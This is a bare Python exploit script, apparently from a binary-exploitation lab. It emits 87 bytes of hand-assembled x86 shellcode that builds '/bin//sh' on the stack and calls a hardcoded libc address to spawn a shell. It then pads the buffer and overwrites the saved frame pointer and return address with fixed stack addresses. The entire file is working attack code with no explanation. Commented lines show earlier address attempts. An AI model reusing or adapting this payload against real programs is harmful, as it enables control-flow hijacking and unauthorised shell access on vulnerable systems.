#!/usr/bin/python

from struct import pack
import sys 

#hex((value+(1<<32))%(1<<32)) <- code snippet to calculate the 2's complement of an hex value (32 bits)
shellcode = [     0x55,
                  0x89, 0xe5,
                  0x83, 0xec, 0x90,
                  0xc7, 0x44, 0x24, 0x27, 0x2f, 0x62, 0x69,
                  0x6e,
                  0xc7, 0x44, 0x24, 0x2b, 0x2f, 0x2f, 0x73,
                  0x68,
                  0x30, 0xdb,
                  0x88, 0x5c, 0x24, 0x2f,
                  0x8d, 0x44, 0x24, 0x27,
                  0x89, 0x44, 0x24, 0x1c,
                  0x31, 0xdb,
                  0x89, 0x5c, 0x24, 0x20,
                  0x89, 0x5c, 0x24, 0x08,
                  0x8d, 0x44, 0x24, 0x1c,
                  0x89, 0x44, 0x24, 0x04,
                  0x8d, 0x44, 0x24, 0x27,
                  0x89, 0x04, 0x24,
#                  0xe8, 0x24, 0x6f, 0xec, 0xf7,
                  0xe8, 0x44, 0x62, 0xec, 0xf7,
                  0x31, 0xc0,
                  0xc9,
                  0xc3 ]
shellcode.extend( [ ord(' ') for x in range(8) ] )
#shellcode.extend( [ 0x58, 0xf0, 0xff, 0xbf, 0x0a, 0xf0, 0xff, 0xbf ] ) # upper frame pointer and return address
shellcode.extend( [ 0x58, 0xf0, 0xff, 0xbf, 0xea, 0xfc, 0xff, 0xbf ] ) # upper frame pointer and return address
shellcode.extend([ 0 ])
sys.stdout.write(pack('B'*87, *shellcode))
